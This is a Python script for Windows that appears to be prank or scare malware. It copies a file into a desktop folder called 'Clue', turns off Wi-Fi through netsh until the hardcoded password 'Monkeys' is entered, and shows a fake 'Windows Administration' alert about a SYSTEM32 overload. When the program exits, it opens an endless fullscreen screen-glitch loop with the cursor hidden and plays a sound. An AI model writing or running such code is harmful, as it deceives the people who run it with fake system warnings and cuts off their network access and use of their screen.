from ctypes import windll
import pyautogui as py
from PIL import Image, ImageTk
import winsound
import os
import shutil
import time
import subprocess
import atexit

try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk

import pygame.display
from PIL import ImageGrab, Image
import random
import pygame.mixer
from tkinter import messagebox
from win10toast import ToastNotifier

from win32api import *
from win32gui import *
import win32con
import sys, os
import struct

import os
import shutil
import zipfile

import subprocess
import tkinter as tk
from tkinter import messagebox

# Specify the path of the file you want to copy
source_file = r"C:\Users\newma\PycharmProjects\vpn\elddir.txt"

# Specify the name of the new folder
folder_name = "Clue"


# Get the path to the user's desktop directory
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create a new folder on the desktop
new_folder_path = os.path.join(desktop_path, folder_name)
os.makedirs(new_folder_path, exist_ok=True)

# Specify the destination path for the copied file
destination_path = os.path.join(new_folder_path, os.path.basename(source_file))

# Copy the file to the new folder
shutil.copy2(source_file, destination_path)

print("Windows Bypass initialising")

def disable_wifi():
    subprocess.run(["netsh", "interface", "set", "interface", "Wi-Fi", "admin=disable"])

def enable_wifi():
    subprocess.run(["netsh", "interface", "set", "interface", "Wi-Fi", "admin=enable"])

def validate_password():
    password = "Monkeys"
    entered_password = password_entry.get()

    if entered_password == password:
        enable_wifi()
        messagebox.showinfo("Success", "Wi-Fi has been enabled.")
        root.destroy()  # Close the window after successful password entry
    else:
        disable_wifi()
        messagebox.showerror("Error", "Incorrect password.")

# Disable Wi-Fi on program startup
disable_wifi()

root = tk.Tk()
root.title("Wi-Fi Password")
root.geometry("300x100")

password_label = tk.Label(root, text="Enter the password:")
password_label.pack()

password_entry = tk.Entry(root, show="*")
password_entry.pack()

submit_button = tk.Button(root, text="Submit", command=validate_password)
submit_button.pack()

root.mainloop()


time.sleep(2)

toaster = ToastNotifier()
toaster.show_toast("Windows Administration", "Your PC has encountered an overload to SYSTEM32 files.")


time.sleep(2)

def on_exit():
    from platform import system

    if system() == "Windows":
        import ctypes

        def change_wallpaper(uri):
            uri = uri.replace("/", "\\")
            ctypes.windll.user32.SystemParametersInfoA(20, 26, uri, 1)

    image = ImageGrab.grab()
    pygame.init()
    screen = pygame.display.set_mode((image.width, image.height))
    clock = pygame.time.Clock()

    time.sleep(3)
    winsound.PlaySound('PRISMA-sound.wav', winsound.SND_ASYNC)

    def ImgToSurface(image):
        i = pygame.image.fromstring(image.tobytes(), image.size, image.mode).convert()
        return pygame.transform.scale(i, (1920, 1080))

    def mainpulate(image):
        random_column = random.randint(0, image.width)
        c = image.crop((random_column, 0, random_column + random.randint(5, 20), image.height))
        image.paste(c, (random_column, random.randint(1, 3)))

    pygame.mouse.set_visible(False)
    t = 0
    pg_in = ImgToSurface(image)
    while 1:
        for ev in pygame.event.get(): pass
        screen.blit(pg_in, (0, 0))
        if t % random.randint(2, 5):
            mainpulate(image)
            pg_in = ImgToSurface(image)
        pygame.display.update()
        clock.tick(120)
        t += 1


atexit.register(on_exit)
